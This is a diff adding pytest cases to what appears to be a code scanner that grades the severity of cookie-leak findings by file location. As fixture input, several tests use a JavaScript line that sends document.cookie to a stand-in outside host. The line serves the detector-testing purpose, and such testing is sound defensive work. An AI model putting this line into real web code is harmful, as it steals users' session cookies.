@@ -597,3 +597,20 @@ def test_probe_json_module(body, code):
 def test_probe_json_module_plain_ok():
     c = codes({"static/src/d.json": '{"label":"Hello","path":"/shop"}'})
     assert not {k for k, s in c if k.startswith("json-module") }, c
+
+
+# ---------------------------------------------------------------- probe j-tests-dir
+@pytest.mark.parametrize("n", ["static/tests/a.test.js", "static/tests/helpers/a.js", "static/tests/tours/t.js"])
+def test_probe_js_tests_dir_medium(n):
+    c = codes({n: "fetch('https://e.v/'+document.cookie);\n"})
+    assert ("js-cookie-leak", "medium") in c, c
+
+
+def test_probe_py_tests_stay_low():
+    c = codes({"tests/test_a.py": "import requests\ndef test_a():\n    requests.get('https://e.v')\n"})
+    assert not {k for k, s in c if s in ("high", "medium") and k != "test-tamper"}, c
+
+
+def test_probe_js_in_prod_bundle_keeps_high():
+    # a tests/ folder inside an asset glob ships to production: full severity
+    assert ("js-cookie-leak", "high") in codes({"static/src/x/tests/a.js": "fetch('https://e.v/'+document.cookie);\n"})
